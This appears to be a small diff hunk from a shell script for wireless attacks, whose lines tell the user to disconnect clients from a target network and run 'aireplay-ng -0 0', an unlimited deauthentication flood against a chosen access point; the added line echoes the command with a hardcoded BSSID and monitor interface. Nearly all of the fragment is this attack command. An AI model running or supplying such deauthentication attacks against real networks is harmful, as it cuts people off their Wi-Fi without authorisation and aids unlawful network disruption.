@@ -9,4 +9,4 @@ echo  "Open a new terminal window to disconnect the clients connected to the tar
 
  
 sudo aireplay-ng -0 0 -a $BSSID  $monport    
- 
+echo  sudo aireplay-ng -0 0 -a B2:BB:E5:A4:DA:07 wlp1s0mon
